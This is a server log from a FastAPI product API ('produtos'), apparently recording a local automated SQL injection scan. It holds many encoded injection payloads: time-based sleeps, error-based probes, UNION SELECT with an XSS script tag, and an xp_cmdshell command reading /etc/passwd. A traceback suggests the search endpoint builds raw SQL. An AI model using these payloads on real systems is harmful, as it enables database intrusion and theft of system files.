api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:51624 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/1859%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281859%3D1859%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%28%27bjqz%27%3D%27bjqz HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51638 - "GET /produtos%27/%2A%2A/AND/%2A%2A/1859%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281859%3D1859%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%27kkZg%27%3D%27kkZg HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51600 - "GET /produtos/%2A%2A/AND/%2A%2A/1859%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281859%3D1859%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29--/%2A%2A/AZmD HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51664 - "GET /produtos%29/%2A%2A/AND/%2A%2A/1048/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281048%3D1048%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%288800%3D8800 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51668 - "GET /produtos/%2A%2A/AND/%2A%2A/1048/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281048%3D1048%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51652 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/1048/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281048%3D1048%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%28%27eJJa%27%3D%27eJJa HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51684 - "GET /produtos%27/%2A%2A/AND/%2A%2A/1048/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281048%3D1048%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%27PGNb%27%3D%27PGNb HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51692 - "GET /produtos/%2A%2A/AND/%2A%2A/1048/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281048%3D1048%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--/%2A%2A/TEeQ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51704 - "GET /produtos%29/%2A%2A/AND/%2A%2A/1585%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281585%3D1585%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%287022%3D7022 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51712 - "GET /produtos/%2A%2A/AND/%2A%2A/1585%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281585%3D1585%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51724 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/1585%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281585%3D1585%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%28%27lZyn%27%3D%27lZyn HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51738 - "GET /produtos%27/%2A%2A/AND/%2A%2A/1585%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281585%3D1585%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%27yePi%27%3D%27yePi HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51730 - "GET /produtos/%2A%2A/AND/%2A%2A/1585%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%281585%3D1585%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29--/%2A%2A/JEwx HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51740 - "GET /%28SELECT/%2A%2A/CONCAT%28CONCAT%28%27qvbbq%27%2C%28CASE/%2A%2A/WHEN/%2A%2A/%281601%3D1601%29/%2A%2A/THEN/%2A%2A/%271%27/%2A%2A/ELSE/%2A%2A/%270%27/%2A%2A/END%29%29%2C%27qpzxq%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51746 - "GET /produtos%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51772 - "GET /produtos%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51774 - "GET /produtos%27%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51780 - "GET /produtos%27%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51758 - "GET /produtos%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51788 - "GET /produtos%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51800 - "GET /produtos%27%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51814 - "GET /produtos%27%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51834 - "GET /produtos%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2875%29%7C%7CCHR%28114%29%7C%7CCHR%2869%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51844 - "GET /produtos%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2875%29%7C%7CCHR%28114%29%7C%7CCHR%2869%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51852 - "GET /produtos%27%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2875%29%7C%7CCHR%28114%29%7C%7CCHR%2869%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51868 - "GET /produtos%27%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2875%29%7C%7CCHR%28114%29%7C%7CCHR%2869%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51826 - "GET /produtos%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3578/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29FjCd%29/%2A%2A/AND/%2A%2A/%289091%3D9091 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51872 - "GET /produtos/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3578/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29FjCd%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51884 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3578/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29FjCd%29/%2A%2A/AND/%2A%2A/%28%27oeIA%27%3D%27oeIA HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51886 - "GET /produtos%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3578/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29FjCd%29/%2A%2A/AND/%2A%2A/%27AuLP%27%3D%27AuLP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51900 - "GET /produtos/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3578/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29FjCd%29--/%2A%2A/dWry HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51870 - "GET /produtos%29/%2A%2A/AND/%2A%2A/6983%3D%28SELECT/%2A%2A/6983/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%286873%3D6873 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51904 - "GET /produtos/%2A%2A/AND/%2A%2A/6983%3D%28SELECT/%2A%2A/6983/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51916 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/6983%3D%28SELECT/%2A%2A/6983/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%28%27VQSo%27%3D%27VQSo HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51920 - "GET /produtos%27/%2A%2A/AND/%2A%2A/6983%3D%28SELECT/%2A%2A/6983/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%27eDQJ%27%3D%27eDQJ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51930 - "GET /produtos/%2A%2A/AND/%2A%2A/6983%3D%28SELECT/%2A%2A/6983/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29--/%2A%2A/rlfD HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51940 - "GET /produtos%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%283795%3D3795 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51962 - "GET /produtos/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51950 - "GET /produtos%27%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%28%27FUBn%27%3D%27FUBn HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51976 - "GET /produtos%27/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%27Unua%27%3D%27Unua HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51982 - "GET /produtos/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27--/%2A%2A/fXPe HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:51986 - "GET /produtos%29/%2A%2A/AND/%2A%2A/4955%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%2874%29%7C%7CCHR%28112%29%7C%7CCHR%28116%29%2C5%29/%2A%2A/AND/%2A%2A/%286748%3D6748 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52006 - "GET /produtos/%2A%2A/AND/%2A%2A/4955%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%2874%29%7C%7CCHR%28112%29%7C%7CCHR%28116%29%2C5%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52000 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/4955%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%2874%29%7C%7CCHR%28112%29%7C%7CCHR%28116%29%2C5%29/%2A%2A/AND/%2A%2A/%28%27JeSA%27%3D%27JeSA HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52010 - "GET /produtos%27/%2A%2A/AND/%2A%2A/4955%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%2874%29%7C%7CCHR%28112%29%7C%7CCHR%28116%29%2C5%29/%2A%2A/AND/%2A%2A/%27wIXP%27%3D%27wIXP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52026 - "GET /produtos/%2A%2A/AND/%2A%2A/4955%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2882%29%7C%7CCHR%2874%29%7C%7CCHR%28112%29%7C%7CCHR%28116%29%2C5%29--/%2A%2A/AiGu HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52028 - "GET /produtos%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/Bvws HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52042 - "GET /produtos/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/MUAG HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52054 - "GET /produtos%27%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/VHnH HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52060 - "GET /produtos%27/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/YVtr HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52088 - "GET /produtos/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/hlQC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52092 - "POST /produtos HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52100 - "POST /produtos?spvC=3613%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52114 - "POST /produtos HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52150 - "GET /produtos/1 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52174 - "PUT /produtos/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52188 - "PUT /produtos/1?ASqs=4647%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:52190 - "PUT /produtos/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:40538 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:40542 - "GET /produtos/busca/?nome=teste&hoTm=2365%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:40558 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:40570 - "GET /produtos/busca/?nome=5047 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:40578 - "GET /produtos/busca/?nome=teste%29..%29%2C.%22%29%27%29 HTTP/1.1" 500 Internal Server Error
api-1  | ERROR:    Exception in ASGI application
api-1  | Traceback (most recent call last):
api-1  |   File "/usr/local/lib/python3.12/site-packages/uvicorn/protocols/http/h11_impl.py", line 406, in run_asgi
api-1  |     result = await app(  # type: ignore[func-returns-value]
api-1  |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/uvicorn/middleware/proxy_headers.py", line 70, in __call__
api-1  |     return await self.app(scope, receive, send)
api-1  |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/fastapi/applications.py", line 1054, in __call__
api-1  |     await super().__call__(scope, receive, send)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/applications.py", line 113, in __call__
api-1  |     await self.middleware_stack(scope, receive, send)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/middleware/errors.py", line 187, in __call__
api-1  |     raise exc
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/middleware/errors.py", line 165, in __call__
api-1  |     await self.app(scope, receive, _send)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/middleware/exceptions.py", line 62, in __call__
api-1  |     await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/_exception_handler.py", line 62, in wrapped_app
api-1  |     raise exc
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/_exception_handler.py", line 51, in wrapped_app
api-1  |     await app(scope, receive, sender)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/routing.py", line 715, in __call__
api-1  |     await self.middleware_stack(scope, receive, send)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/routing.py", line 735, in app
api-1  |     await route.handle(scope, receive, send)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/routing.py", line 288, in handle
api-1  |     await self.app(scope, receive, send)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/routing.py", line 76, in app
api-1  |     await wrap_app_handling_exceptions(app, request)(scope, receive, send)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/_exception_handler.py", line 62, in wrapped_app
api-1  |     raise exc
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/_exception_handler.py", line 51, in wrapped_app
api-1  |     await app(scope, receive, sender)
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/routing.py", line 73, in app
api-1  |     response = await f(request)
api-1  |                ^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/fastapi/routing.py", line 301, in app
api-1  |     raw_response = await run_endpoint_function(
api-1  |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/fastapi/routing.py", line 214, in run_endpoint_function
api-1  |     return await run_in_threadpool(dependant.call, **values)
api-1  |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/starlette/concurrency.py", line 39, in run_in_threadpool
api-1  |     return await anyio.to_thread.run_sync(func, *args)
api-1  |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/anyio/to_thread.py", line 63, in run_sync
api-1  |     return await get_async_backend().run_sync_in_worker_thread(
api-1  |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/anyio/_backends/_asyncio.py", line 2518, in run_sync_in_worker_thread
api-1  |     return await future
api-1  |            ^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/anyio/_backends/_asyncio.py", line 1002, in run
api-1  |     result = context.run(func, *args)
api-1  |              ^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/app/main.py", line 216, in buscar_produtos
api-1  |     rows = cursor.execute(sql).fetchall()
api-1  |            ^^^^^^^^^^^^^^^^^^^
api-1  | sqlite3.OperationalError: near ")": syntax error
api-1  | INFO:     172.18.0.1:40590 - "GET /produtos/busca/?nome=teste%27GCVcFb%3C%27%22%3EEpCYdY HTTP/1.1" 500 Internal Server Error
api-1  | ERROR:    Exception in ASGI application
api-1  | Traceback (most recent call last):
api-1  |   File "/usr/local/lib/python3.12/site-packages/uvicorn/protocols/http/h11_impl.py", line 406, in run_asgi
api-1  |     result = await app(  # type: ignore[func-returns-value]
api-1  |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/uvicorn/middleware/proxy_headers.py", line 70, in __call__
api-1  |     return await self.app(scope, receive, send)
api-1  |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
api-1  |   File "/usr/local/lib/python3.12/site-packages/fastapi/applications.py", line 1054, in __call__
api-1  |     await super().__call__(scope, receive, send)
